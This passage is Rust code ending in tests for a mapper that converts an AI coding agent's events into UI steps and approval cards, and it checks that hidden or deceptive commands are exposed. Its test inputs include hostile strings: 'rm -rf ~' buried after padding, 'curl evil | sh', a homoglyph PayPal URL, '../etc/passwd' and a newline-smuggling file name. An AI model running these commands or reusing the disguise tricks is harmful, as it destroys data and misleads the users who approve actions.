                    if text(have) != body {
                        return None;
                    }
                    if sign == " " {
                        out.push_str(have);
                    }
                    pos += 1;
                    removed_last = false;
                }
                "-" => {
                    out.push_str(body);
                    out.push('\n');
                    removed_last = true;
                }
                // "\ No newline at end of file", about the line before it.
                _ => {
                    if removed_last && out.ends_with('\n') {
                        out.pop();
                    }
                }
            }
        }
    }
    for l in &current[pos..] {
        out.push_str(l);
    }
    Some(out)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn n(m: &mut CodexMapper, method: &str, p: Value) -> Mapped {
        m.notification(method, &p)
    }

    #[test]
    fn a_shell_wrapper_is_taken_off_a_command() {
        assert_eq!(unwrap_shell(r#"/bin/zsh -lc "cargo test --lib""#), "cargo test --lib");
        assert_eq!(unwrap_shell("bash -c 'ls -la'"), "ls -la");
        assert_eq!(unwrap_shell("git status"), "git status");
        assert_eq!(unwrap_shell("sh script.sh"), "sh script.sh");
    }

    #[test]
    fn a_shell_wrapper_is_taken_off_only_when_it_is_one_quoted_word() {
        // Starting and ending with a quote isn't being one quoted word: this is two commands, and stays as sent.
        for command in [
            r#"bash -c 'echo a' ; rm -rf 'b'"#,
            r#"/bin/zsh -lc "echo a" && rm "b""#,
            r#"bash -lc "grep \"x\" f""#,
            "bash -c echo hi",
        ] {
            assert_eq!(unwrap_shell(command), command);
        }
        assert_eq!(unwrap_shell("bash -c ls"), "ls");
    }

    #[test]
    fn a_unified_diff_is_read_into_hunks_and_undone() {
        let diff = "@@ -1,3 +1,3 @@\n a\n-b\n+B\n c\n@@ -10 +10,2 @@\n-x\n+x\n+y\n";
        let hunks = parse_unified(diff);
        assert_eq!(hunks.len(), 2);
        assert_eq!((hunks[0].old_start, hunks[0].old_lines, hunks[0].new_start, hunks[0].new_lines), (1, 3, 1, 3));
        assert_eq!((hunks[1].old_start, hunks[1].old_lines, hunks[1].new_start, hunks[1].new_lines), (10, 1, 10, 2));
        assert_eq!(hunks[0].lines, [" a", "-b", "+B", " c"]);
        let now: String = (1..=9).map(|i| match i { 2 => "B\n".to_string(), 1 => "a\n".into(), 3 => "c\n".into(), _ => format!("l{i}\n") }).collect::<String>() + "x\ny\n";
        let before = reverse_apply(&now, &hunks).unwrap();
        assert_eq!(before.lines().nth(1), Some("b"));
        assert!(before.ends_with("l9\nx\n"));
        assert_eq!(before.lines().count(), 10);
    }

    #[test]
    fn a_file_that_changed_again_is_not_guessed_at() {
        let hunks = parse_unified("@@ -1,2 +1,2 @@\n a\n-b\n+B\n");
        assert_eq!(reverse_apply("a\nB\n", &hunks).as_deref(), Some("a\nb\n"));
        assert_eq!(reverse_apply("a\nSOMETHING ELSE\n", &hunks), None);
        assert_eq!(reverse_apply("a\n", &hunks), None);
    }

    #[test]
    fn a_missing_final_newline_is_kept() {
        let hunks = parse_unified("@@ -1 +1 @@\n-old\n\\ No newline at end of file\n+new\n\\ No newline at end of file\n");
        assert_eq!(reverse_apply("new", &hunks).as_deref(), Some("old"));
    }

    #[test]
    fn a_command_is_a_bash_step_with_its_output_and_an_error_when_it_exits_nonzero() {
        let mut m = CodexMapper::new(Path::new("/p"));
        let started = n(&mut m, "item/started", json!({"item": {"type": "commandExecution", "id": "c1", "command": "/bin/zsh -lc \"ls\"", "status": "inProgress"}}));
        assert!(matches!(&started.events[..], [UiEvent::ToolStarted { name, summary, tool_use_id, .. }] if name == "Bash" && summary == "ls" && tool_use_id == "c1"));
        let done = n(&mut m, "item/completed", json!({"item": {"type": "commandExecution", "id": "c1", "command": "/bin/zsh -lc \"ls\"", "status": "failed", "aggregatedOutput": "nope", "exitCode": 2}}));
        assert!(matches!(&done.events[..], [UiEvent::ToolFinished { is_error: true, output, .. }] if output == "nope"));
    }

    #[test]
    fn text_streams_by_item_and_settles_as_the_whole_message() {
        let mut m = CodexMapper::new(Path::new("/p"));
        let d = n(&mut m, "item/agentMessage/delta", json!({"itemId": "a1", "delta": "Hel"}));
        assert!(matches!(&d.events[..], [UiEvent::TextDelta { block_id, text, .. }] if block_id == "a1" && text == "Hel"));
        let done = n(&mut m, "item/completed", json!({"item": {"type": "agentMessage", "id": "a1", "text": "Hello"}}));
        assert!(matches!(&done.events[..], [UiEvent::AssistantText { block_id, text, .. }] if block_id == "a1" && text == "Hello"));
        assert!(n(&mut m, "item/reasoning/summaryTextDelta", json!({"itemId": "r", "delta": "x"})).events.is_empty());
    }

    #[test]
    fn reasoning_shows_one_thinking_marker() {
        let mut m = CodexMapper::new(Path::new("/p"));
        assert!(matches!(&n(&mut m, "item/started", json!({"item": {"type": "reasoning", "id": "r1"}})).events[..], [UiEvent::Thinking { parent: None }]));
        assert!(n(&mut m, "item/started", json!({"item": {"type": "reasoning", "id": "r1"}})).events.is_empty());
    }

    #[test]
    fn an_edit_is_shown_with_its_hunks_and_its_before_is_worked_out_from_the_file() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("a.txt"), "one\nTWO\nthree\n").unwrap();
        let mut m = CodexMapper::new(dir.path());
        let change = json!({"path": "a.txt", "kind": {"type": "update", "move_path": null}, "diff": "@@ -1,3 +1,3 @@\n one\n-two\n+TWO\n three\n"});
        let started = n(&mut m, "item/started", json!({"item": {"type": "fileChange", "id": "f1", "changes": [change], "status": "inProgress"}}));
        assert!(matches!(&started.events[..], [UiEvent::ToolStarted { name, summary, .. }] if name == "Edit" && summary == "a.txt"));
        let done = n(&mut m, "item/completed", json!({"item": {"type": "fileChange", "id": "f1", "changes": [change], "status": "completed"}}));
        let path = dir.path().join("a.txt").display().to_string();
        assert_eq!(done.edits, vec![(path.clone(), Some("one\ntwo\nthree\n".to_string()))]);
        assert!(matches!(&done.events[0], UiEvent::EditApplied { path: p, created: false, hunks, .. } if *p == path && hunks.len() == 1));
        assert!(matches!(&done.events[1], UiEvent::ToolFinished { is_error: false, output, .. } if output == "Edited a.txt"));
    }

    #[test]
    fn a_created_file_has_no_before_and_a_deleted_one_has_its_text() {
        let dir = tempfile::tempdir().unwrap();
        let mut m = CodexMapper::new(dir.path());
        let changes = json!([
            {"path": "new.txt", "kind": {"type": "add"}, "diff": "hello\nworld\n"},
            {"path": "old.txt", "kind": {"type": "delete"}, "diff": "bye\n"}
        ]);
        let done = n(&mut m, "item/completed", json!({"item": {"type": "fileChange", "id": "f", "changes": changes, "status": "completed"}}));
        let new = dir.path().join("new.txt").display().to_string();
        let old = dir.path().join("old.txt").display().to_string();
        assert_eq!(done.edits, vec![(new, None), (old, Some("bye\n".to_string()))]);
        // The step is announced if it wasn't (a finish without its start).
        assert!(matches!(&done.events[0], UiEvent::ToolStarted { .. }));
        match &done.events[1] {
            UiEvent::EditApplied { created: true, hunks, .. } => assert_eq!((hunks[0].new_start, hunks[0].new_lines, hunks[0].lines.clone()), (1, 2, vec!["+hello".to_string(), "+world".to_string()])),
            other => panic!("{other:?}"),
        }
    }

    #[test]
    fn an_edit_whose_file_no_longer_matches_is_shown_but_not_recorded_for_revert() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("a.txt"), "completely different\n").unwrap();
        let mut m = CodexMapper::new(dir.path());
        let change = json!({"path": "a.txt", "kind": {"type": "update", "move_path": null}, "diff": "@@ -1 +1 @@\n-x\n+y\n"});
        let done = n(&mut m, "item/completed", json!({"item": {"type": "fileChange", "id": "f", "changes": [change], "status": "completed"}}));
        assert!(done.edits.is_empty());
        assert!(done.events.iter().any(|e| matches!(e, UiEvent::EditApplied { .. })));
    }

    #[test]
    fn a_declined_change_is_an_error_step_and_counts_as_denied() {
        let mut m = CodexMapper::new(Path::new("/p"));
        let change = json!({"path": "a.txt", "kind": {"type": "add"}, "diff": "x"});
        let done = n(&mut m, "item/completed", json!({"item": {"type": "fileChange", "id": "f", "changes": [change], "status": "declined"}}));
        assert!(!done.events.iter().any(|e| matches!(e, UiEvent::EditApplied { .. })));
        assert!(matches!(done.events.last(), Some(UiEvent::ToolFinished { is_error: true, output, .. }) if output == "Declined."));
        let end = n(&mut m, "turn/completed", json!({"turn": {"status": "completed"}}));
        assert!(matches!(&end.events[..], [UiEvent::TurnDone { denied: 1, .. }]));
    }

    #[test]
    fn a_turn_reports_tokens_and_no_dollars() {
        let mut m = CodexMapper::new(Path::new("/p"));
        n(&mut m, "turn/started", json!({"turn": {"id": "t"}}));
        let usage = |total: u64, last: u64| json!({"tokenUsage": {"total": {"totalTokens": total}, "last": {"totalTokens": last}, "modelContextWindow": 272000}});
        // The thread had 1000 tokens before this turn; it made two calls.
        let u1 = n(&mut m, "thread/tokenUsage/updated", usage(1500, 500));
        assert!(matches!(&u1.events[..], [UiEvent::ContextUsed { tokens: 500 }]));
        n(&mut m, "thread/tokenUsage/updated", usage(2400, 900));
        let end = n(&mut m, "turn/completed", json!({"turn": {"status": "completed", "durationMs": 1234}}));
        match &end.events[..] {
            [UiEvent::TurnDone { is_error: false, result: None, cost_usd: None, tokens: Some(1400), session_cost_usd: None, session_tokens: 2400, duration_ms: Some(1234), auth_hint: false, denied: 0, context_window: Some(272000) }] => {}
            other => panic!("{other:?}"),
        }
        // The next turn counts from where this one ended.
        n(&mut m, "turn/started", json!({"turn": {"id": "t2"}}));
        n(&mut m, "thread/tokenUsage/updated", usage(3000, 600));
        let end = n(&mut m, "turn/completed", json!({"turn": {"status": "completed"}}));
        assert!(matches!(&end.events[..], [UiEvent::TurnDone { tokens: Some(600), .. }]));
    }

    #[test]
    fn a_turn_without_usage_has_no_token_count() {
        let mut m = CodexMapper::new(Path::new("/p"));
        let end = n(&mut m, "turn/completed", json!({"turn": {"status": "completed"}}));
        assert!(matches!(&end.events[..], [UiEvent::TurnDone { tokens: None, session_tokens: 0, .. }]));
    }

    #[test]
    fn interrupted_and_failed_turns_end_as_errors_and_a_sign_in_failure_says_how_to_fix_it() {
        let mut m = CodexMapper::new(Path::new("/p"));
        let end = n(&mut m, "turn/completed", json!({"turn": {"status": "interrupted"}}));
        assert!(matches!(&end.events[..], [UiEvent::TurnDone { is_error: true, result: Some(r), .. }] if r == "interrupted"));
        let end = n(&mut m, "turn/completed", json!({"turn": {"status": "failed", "error": {"message": "401 Unauthorized", "codexErrorInfo": "unauthorized"}}}));
        match &end.events[..] {
            [UiEvent::TurnDone { is_error: true, result: Some(r), auth_hint: true, .. }] => assert!(r.contains("codex login"), "{r}"),
            other => panic!("{other:?}"),
        }
        let end = n(&mut m, "turn/completed", json!({"turn": {"status": "failed", "error": {"message": "Rate limited", "additionalDetails": "try at 5"}}}));
        assert!(matches!(&end.events[..], [UiEvent::TurnDone { result: Some(r), auth_hint: false, .. }] if r == "Rate limited (try at 5)"));
    }

    #[test]
    fn a_dropped_stream_that_will_retry_is_a_numbered_retry_and_a_final_error_waits_for_the_turn() {
        let mut m = CodexMapper::new(Path::new("/p"));
        let e = |retry: bool| json!({"error": {"message": "stream closed"}, "willRetry": retry, "threadId": "t", "turnId": "u"});
        assert!(matches!(&n(&mut m, "error", e(true)).events[..], [UiEvent::Retrying { attempt: 1, error, .. }] if error == "stream closed"));
        assert!(matches!(&n(&mut m, "error", e(true)).events[..], [UiEvent::Retrying { attempt: 2, .. }]));
        assert!(n(&mut m, "error", e(false)).events.is_empty());
    }

    #[test]
    fn mcp_and_search_tools_are_steps_and_notifications_that_are_not_conversation_are_ignored() {
        let mut m = CodexMapper::new(Path::new("/p"));
        let s = n(&mut m, "item/started", json!({"item": {"type": "mcpToolCall", "id": "m1", "server": "docs", "tool": "search", "arguments": {"q": "x"}}}));
        assert!(matches!(&s.events[..], [UiEvent::ToolStarted { name, .. }] if name == "mcp__docs__search"));
        let d = n(&mut m, "item/completed", json!({"item": {"type": "mcpToolCall", "id": "m1", "server": "docs", "tool": "search", "status": "completed", "arguments": {}, "result": {"content": [{"type": "text", "text": "found"}]}}}));
        assert!(matches!(&d.events[..], [UiEvent::ToolFinished { is_error: false, output, .. }] if output == "found"));
        for method in ["thread/started", "remoteControl/status/changed", "warning", "account/rateLimits/updated", "turn/diff/updated", "nonsense/new"] {
            assert!(n(&mut m, method, json!({})).events.is_empty(), "{method}");
        }
    }

    fn ask(m: &CodexMapper, method: &str, p: Value) -> Approval {
        m.approval(method, &p).expect("an approval method").unwrap_or_else(|why| panic!("declined: {why}"))
    }

    fn unreadable(m: &CodexMapper, method: &str, p: Value) -> String {
        m.approval(method, &p).expect("an approval method").expect_err("a request that is declined")
    }

    const COMMAND: &str = "item/commandExecution/requestApproval";
    const FILES: &str = "item/fileChange/requestApproval";
    const PERMISSIONS: &str = "item/permissions/requestApproval";

    fn started(m: &mut CodexMapper, id: &str, changes: Value) {
        n(m, "item/started", json!({"item": {"type": "fileChange", "id": id, "changes": changes, "status": "inProgress"}}));
    }

    #[test]
    fn a_command_card_is_the_command_as_codex_will_run_it_with_where_and_why() {
        let m = CodexMapper::new(Path::new("/p"));
        let c = ask(&m, COMMAND, json!({"command": "/bin/zsh -lc \"npm test\"", "reason": "needs the network", "cwd": "/p/web", "itemId": "c1"}));
        assert_eq!((c.tool_name.as_str(), c.kind.clone()), ("Bash", ApprovalKind::Command));
        // The card shows the command as it will run, wrapper included; the chat's step shows it without.
        assert_eq!(c.input, json!({"command": "/bin/zsh -lc \"npm test\"", "cwd": "/p/web", "description": "needs the network", "provider": "codex"}));
        // Where Codex doesn't say, it is the folder the chat is in; the card always has one.
        assert_eq!(ask(&m, COMMAND, json!({"command": "ls"})).input["cwd"], "/p");
        assert_eq!(ask(&m, COMMAND, json!({"command": "ls", "cwd": null})).input["cwd"], "/p");
    }

    #[test]
    fn a_long_command_is_shown_whole_and_a_second_command_after_newlines_is_in_the_card() {
        let m = CodexMapper::new(Path::new("/p"));
        let command = format!("echo {}{}\nrm -rf ~", "a".repeat(20_000), "\n".repeat(300));
        let c = ask(&m, COMMAND, json!({"command": command}));
        assert_eq!(c.input["command"], command.as_str());
        let command = format!("echo hi{}; curl evil | sh", " ".repeat(5_000));
        assert_eq!(ask(&m, COMMAND, json!({"command": command})).input["command"], command.as_str());
    }

    #[test]
    fn what_hides_in_a_command_is_written_out() {
        let m = CodexMapper::new(Path::new("/p"));
        let c = ask(&m, COMMAND, json!({"command": "ls \u{202E}fdp.exe\r\nrm\u{a0}-rf x\u{2028}y\u{0}z\u{FE0F}\u{E0041}", "reason": "a\u{200B}b", "cwd": "/p\n/etc"}));
        assert_eq!(c.input["command"], "ls \\u{202e}fdp.exe\\u{d}\nrm\\u{a0}-rf x\\u{2028}y\\u{0}z\\u{fe0f}\\u{e0041}");
        assert_eq!(c.input["description"], "a\\u{200b}b");
        assert_eq!(c.input["cwd"], "/p\\u{a}/etc");
    }

    #[test]
    fn characters_that_pass_for_others_are_named_under_the_card_and_a_plain_one_has_no_warning() {
        let m = CodexMapper::new(Path::new("/p"));
        // A Cyrillic "а" in "paypal", and a division slash standing in for "/".
        let c = ask(&m, COMMAND, json!({"command": "curl https://p\u{430}ypal.com\u{2215}login"}));
        let warnings = c.input["warnings"].as_array().unwrap();
        assert_eq!(warnings.len(), 1);
        let w = warnings[0].as_str().unwrap();
        assert!(w.contains("U+0430") && w.contains("U+2215"), "{w}");
        assert!(ask(&m, COMMAND, json!({"command": "curl https://paypal.com/login"})).input.get("warnings").is_none());
        // A folder named in Russian is shown as it is, with the note.
        let c = ask(&m, COMMAND, json!({"command": "ls", "cwd": "/Users/Пётр"}));
        assert_eq!(c.input["cwd"], "/Users/Пётр");
        assert!(c.input["warnings"][0].as_str().unwrap().contains("U+041F"));
    }

    #[test]
    fn network_access_is_said_beside_the_command_or_alone_and_a_stdin_approval_is_not_a_command() {
        let m = CodexMapper::new(Path::new("/p"));
        let net = json!({"host": "evil.example\u{200B}.com", "protocol": "https"});
        let c = ask(&m, COMMAND, json!({"command": "echo hello", "networkApprovalContext": net}));
        assert_eq!((c.input["command"].as_str(), c.input["network"].as_str()), (Some("echo hello"), Some("evil.example\\u{200b}.com (https)")));
        assert!(c.input.get("action").is_none());
        let c = ask(&m, COMMAND, json!({"networkApprovalContext": net}));
        assert!(c.input.get("command").is_none());
        assert_eq!(c.input["action"], "Network access");
        let c = ask(&m, COMMAND, json!({"kind": "writeStdin", "command": "ssh host"}));
        assert!(c.input["action"].as_str().unwrap().starts_with("Send input to this running command"));
        assert!(ask(&m, COMMAND, json!({"kind": "writeStdin"})).input["action"].as_str().unwrap().contains("not shown"));
    }

    #[test]
    fn a_command_request_that_is_missing_something_or_of_another_type_is_declined_not_asked() {
        let m = CodexMapper::new(Path::new("/p"));
        for bad in [
            json!({}),
            json!({"command": null}),
            json!({"command": "  "}),
            json!({"command": 7}),
            json!({"command": ["rm", "-rf", "/"]}),
            json!({"command": "ls", "cwd": 5}),
            json!({"command": "ls", "cwd": " "}),
            json!({"command": "ls", "reason": ["x"]}),
            json!({"command": "ls", "kind": "somethingNew"}),
            json!({"command": "ls", "kind": 3}),
            json!({"networkApprovalContext": {"protocol": "https"}}),
            json!({"networkApprovalContext": {"host": "a.com"}}),
            json!({"command": "ls", "networkApprovalContext": "a.com"}),
            json!({"kind": "writeStdin", "networkApprovalContext": {"host": ""}}),
        ] {
            assert!(m.approval(COMMAND, &bad).unwrap().is_err(), "{bad}");
        }
    }

    #[test]
    fn a_file_card_lists_every_file_with_what_happens_to_it() {
        let mut m = CodexMapper::new(Path::new("/p"));
        let change = json!({"path": "src/a.rs", "kind": {"type": "update", "move_path": null}, "diff": ""});
        let moved = json!({"path": "b.rs", "kind": {"type": "update", "move_path": "c.rs"}, "diff": ""});
        started(&mut m, "f1", json!([change]));
        let f = ask(&m, FILES, json!({"itemId": "f1", "reason": "outside the workspace"}));
        assert_eq!(f.tool_name, "Edit");
        assert_eq!(f.input["file_path"], "Edit /p/src/a.rs");
        assert_eq!(f.input["description"], "outside the workspace");
        // Every file is listed, a moved one with where it goes, and a root it also asks for is said.
        started(&mut m, "f2", json!([change, moved]));
        let f = ask(&m, FILES, json!({"itemId": "f2", "grantRoot": "/etc"}));
        assert_eq!(f.input["file_path"], "Edit /p/src/a.rs\nMove /p/b.rs → /p/c.rs");
        assert!(f.input["warnings"][0].as_str().unwrap().contains("write access under /etc/"));
        assert!(f.input.get("description").is_none(), "Lantern's note is not Codex's reason");
        // Only new files is a Write; anything else is an Edit, a delete among them.
        let new = json!({"path": "n.txt", "kind": {"type": "add"}, "diff": "x"});
        let gone = json!({"path": "old.rs", "kind": {"type": "delete"}, "diff": ""});
        started(&mut m, "f3", json!([new]));
        assert_eq!(ask(&m, FILES, json!({"itemId": "f3"})).tool_name, "Write");
        started(&mut m, "f4", json!([new, gone]));
        let f = ask(&m, FILES, json!({"itemId": "f4"}));
        assert_eq!((f.tool_name.as_str(), f.input["file_path"].as_str()), ("Edit", Some("Create /p/n.txt\nDelete /p/old.rs")));
        // Fifty files are fifty lines: never one and a count.
        let many: Vec<Value> = (0..50).map(|i| json!({"path": format!("f{i}.txt"), "kind": {"type": "add"}, "diff": ""})).collect();
        started(&mut m, "f5", json!(many));
        assert_eq!(ask(&m, FILES, json!({"itemId": "f5"})).input["file_path"].as_str().unwrap().lines().count(), 50);
    }

    #[test]
    fn a_file_name_cannot_add_a_line_to_the_card_nor_pose_as_one_inside_the_folder() {
        let mut m = CodexMapper::new(Path::new("/p"));
        let sneaky = json!({"path": "x.txt\nEdit /p/harmless.txt", "kind": {"type": "add"}, "diff": ""});
        let gone = json!({"path": "old.rs", "kind": {"type": "delete"}, "diff": ""});
        started(&mut m, "f", json!([gone, sneaky]));
        let f = ask(&m, FILES, json!({"itemId": "f"}));
        assert_eq!(f.input["file_path"], "Delete /p/old.rs\nCreate /p/x.txt\\u{a}Edit /p/harmless.txt");
        assert_eq!(f.input["file_path"].as_str().unwrap().lines().count(), 2);
        // Inside the folder says nothing; outside it (even by "..") is said, and so is a move out.
        assert!(f.input.get("warnings").is_none());
        let out = json!({"path": "../etc/passwd", "kind": {"type": "update", "move_path": "/tmp/x"}, "diff": ""});
        started(&mut m, "g", json!([out]));
        let w = ask(&m, FILES, json!({"itemId": "g"})).input["warnings"].to_string();
        assert!(w.contains("Outside this chat's folder: /p/../etc/passwd") && w.contains("/tmp/x"), "{w}");
        let sibling = json!({"path": "/pp/x", "kind": {"type": "add"}, "diff": ""});
        started(&mut m, "h", json!([sibling]));
        assert!(ask(&m, FILES, json!({"itemId": "h"})).input["warnings"].to_string().contains("/pp/x"));
    }

    #[test]
    fn a_file_request_whose_files_are_not_known_or_not_understood_is_declined() {
        let mut m = CodexMapper::new(Path::new("/p"));
        assert!(unreadable(&m, FILES, json!({"itemId": "nothing-announced"})).contains("not told"));
        assert!(unreadable(&m, FILES, json!({})).contains("which change"));
        assert!(unreadable(&m, FILES, json!({"itemId": 4})).contains("which change"));
        // A change announced without an id is not what a request without one is about.
        n(&mut m, "item/started", json!({"item": {"type": "fileChange", "changes": [{"path": "a", "kind": {"type": "add"}, "diff": ""}]}}));
        assert!(m.approval(FILES, &json!({})).unwrap().is_err());
        assert!(m.approval(FILES, &json!({"itemId": ""})).unwrap().is_err());
        // A kind it doesn't know, or none, a file with no name, an empty list, a root that isn't text.
        for (i, change) in [
            json!({"path": "a", "kind": {"type": "symlink"}, "diff": ""}),
            json!({"path": "a", "diff": ""}),
            json!({"path": "a", "kind": "add", "diff": ""}),
            json!({"kind": {"type": "add"}, "diff": ""}),
            json!({"path": "", "kind": {"type": "add"}, "diff": ""}),
            json!({"path": "a", "kind": {"type": "update", "move_path": ""}, "diff": ""}),
        ]
        .into_iter()
        .enumerate()
        {
            let id = format!("bad{i}");
            started(&mut m, &id, json!([change]));
            assert!(m.approval(FILES, &json!({"itemId": id})).unwrap().is_err(), "{change}");
        }
        started(&mut m, "empty", json!([]));
        assert!(m.approval(FILES, &json!({"itemId": "empty"})).unwrap().is_err());
        started(&mut m, "ok", json!([{"path": "a", "kind": {"type": "add"}, "diff": ""}]));
        assert!(m.approval(FILES, &json!({"itemId": "ok", "grantRoot": ["/"]})).unwrap().is_err());
        assert!(m.approval(FILES, &json!({"itemId": "ok", "reason": 5})).unwrap().is_err());
    }

    #[test]
    fn a_file_card_follows_the_latest_patch() {
        let mut m = CodexMapper::new(Path::new("/p"));
        started(&mut m, "f", json!([{"path": "a.txt", "kind": {"type": "add"}, "diff": ""}]));
        assert_eq!(ask(&m, FILES, json!({"itemId": "f"})).input["file_path"], "Create /p/a.txt");
        n(&mut m, "item/fileChange/patchUpdated", json!({"itemId": "f", "changes": [{"path": "a.txt", "kind": {"type": "add"}, "diff": ""}, {"path": "b.txt", "kind": {"type": "delete"}, "diff": ""}]}));
        assert_eq!(ask(&m, FILES, json!({"itemId": "f"})).input["file_path"], "Create /p/a.txt\nDelete /p/b.txt");
    }

    #[test]
    fn a_permissions_card_says_in_words_what_would_be_granted() {
        let m = CodexMapper::new(Path::new("/p"));
        let asked = json!({"network": {"enabled": true}, "fileSystem": {
            "read": ["/data"], "write": ["/out\n/etc"],
            "entries": [
                {"access": "write", "path": {"type": "special", "value": {"kind": "root"}}},
                {"access": "deny", "path": {"type": "path", "path": "/secret"}},
                {"access": "read", "path": {"type": "glob_pattern", "pattern": "**/*.env"}},
                {"access": "write", "path": {"type": "special", "value": {"kind": "project_roots", "subpath": "dist"}}},
                {"access": "read", "path": {"type": "special", "value": {"kind": "tmpdir"}}}
            ], "globScanMaxDepth": 3}});
        let p = ask(&m, PERMISSIONS, json!({"permissions": asked, "cwd": "/p", "reason": "fetch"}));
        assert_eq!(p.tool_name, "Permissions");
        assert_eq!(
            p.input["permissions"],
            "Use the network\nRead /data\nWrite /out\\u{a}/etc\nWrite the whole disk\nNever touch /secret\nRead anything matching **/*.env\nWrite the project folder/dist\nRead the temporary folder\n(patterns are searched 3 folders deep)"
        );
        assert_eq!((p.input["cwd"].as_str(), p.input["description"].as_str()), (Some("/p"), Some("fetch")));
        // What is granted on Allow is the asked-for permission, not a reading of it.
        assert_eq!(p.kind, ApprovalKind::Permissions { requested: asked });
        // Network off and nothing else is nothing to allow.
        assert!(m.approval(PERMISSIONS, &json!({"permissions": {"network": {"enabled": false}, "fileSystem": null}, "cwd": "/p"})).unwrap().is_err());
    }

    #[test]
    fn a_permissions_request_of_another_shape_is_declined() {
        let m = CodexMapper::new(Path::new("/p"));
        let net = json!({"network": {"enabled": true}});
        let bad = [
            json!({"permissions": null, "cwd": "/p"}),
            json!({"permissions": "network", "cwd": "/p"}),
            json!({"permissions": {}, "cwd": "/p"}),
            json!({"permissions": net, "cwd": null}),
            json!({"permissions": net}),
            json!({"permissions": {"network": {"enabled": "yes"}}, "cwd": "/p"}),
            json!({"permissions": {"network": {"enabled": true, "hosts": ["*"]}}, "cwd": "/p"}),
            json!({"permissions": {"network": true}, "cwd": "/p"}),
            json!({"permissions": {"network": {"enabled": true}, "shell": {}}, "cwd": "/p"}),
            json!({"permissions": {"fileSystem": {"read": "/"}}, "cwd": "/p"}),
            json!({"permissions": {"fileSystem": {"read": [1]}}, "cwd": "/p"}),
            json!({"permissions": {"fileSystem": {"entries": [{"access": "own", "path": {"type": "path", "path": "/"}}]}}, "cwd": "/p"}),
            json!({"permissions": {"fileSystem": {"entries": [{"access": "write", "path": {"type": "special", "value": {"kind": "home"}}}]}}, "cwd": "/p"}),
            json!({"permissions": {"fileSystem": {"entries": [{"access": "write", "path": {"type": "link", "path": "/"}}]}}, "cwd": "/p"}),
            json!({"permissions": {"fileSystem": {"mount": ["/"]}}, "cwd": "/p"}),
            json!({"permissions": {"fileSystem": {"write": ["/x"], "globScanMaxDepth": "deep"}}, "cwd": "/p"}),
        ];
        for b in bad {
            assert!(m.approval(PERMISSIONS, &b).unwrap().is_err(), "{b}");
        }
        assert!(m.approval("item/tool/call", &json!({})).is_none());
        assert!(m.approval("execCommandApproval", &json!({"command": ["ls"]})).is_none());
    }

    #[test]
    fn a_tool_named_like_a_built_in_is_not_taken_for_it() {
        let mut m = CodexMapper::new(Path::new("/p"));
        let s = n(&mut m, "item/started", json!({"item": {"type": "dynamicToolCall", "id": "d", "tool": "Bash", "arguments": {}}}));
        assert!(matches!(&s.events[..], [UiEvent::ToolStarted { name, .. }] if name == "dynamic__Bash"));
        let s = n(&mut m, "item/started", json!({"item": {"type": "commandExecution", "id": "c", "command": "ls \u{202E}x"}}));
        assert!(matches!(&s.events[..], [UiEvent::ToolStarted { name, summary, .. }] if name == "Bash" && summary == "ls \\u{202e}x"));
    }

    #[test]
    fn a_threads_turns_read_back_as_the_conversation_a_main_agent_reads() {
        let thread = json!({"turns": [
            {"status": "completed", "items": [
                {"type": "userMessage", "id": "u", "content": [{"type": "text", "text": "[From the main agent] fix it"}]},
                {"type": "reasoning", "id": "r", "summary": [], "content": []},
                {"type": "commandExecution", "id": "c", "command": "cargo test", "status": "completed", "aggregatedOutput": "ok", "exitCode": 0},
                {"type": "agentMessage", "id": "a", "text": "Fixed."}
            ]},
            {"status": "failed", "error": {"message": "boom"}, "items": []}
        ]});
        let events = thread_events(Path::new("/p"), &thread);
        let lines = crate::orchestra::condense(&events);
        assert_eq!(lines[0], "lead: fix it");
        assert!(lines.iter().any(|l| l.starts_with("tool Bash: cargo test")));
        assert!(lines.iter().any(|l| l == "agent: Fixed."));
        assert_eq!(lines.iter().filter(|l| l.starts_with("— turn ended")).count(), 2);
        assert_eq!(lines.last().unwrap(), "— turn ended with an error —");
    }

    #[test]
    fn the_model_picker_lists_visible_models_with_the_efforts_lantern_can_send() {
        let data = json!([
            {"id": "gpt-6.1-sol", "model": "gpt-6.1-sol", "displayName": "GPT-6.1-Sol", "description": "d", "hidden": false, "isDefault": true,
             "supportedReasoningEfforts": [{"reasoningEffort": "low"}, {"reasoningEffort": "high"}, {"reasoningEffort": "ultra"}]},
            {"id": "secret", "model": "secret", "hidden": true, "isDefault": false, "supportedReasoningEfforts": []}
        ]);
        let (options, default) = model_options(&data);
        assert_eq!(default.as_deref(), Some("gpt-6.1-sol"));
        assert_eq!(options.len(), 1);
        assert_eq!((options[0].value.as_str(), options[0].display_name.as_str()), ("gpt-6.1-sol", "GPT-6.1-Sol"));
        assert_eq!(options[0].effort_levels, ["low", "high"]);
    }
}
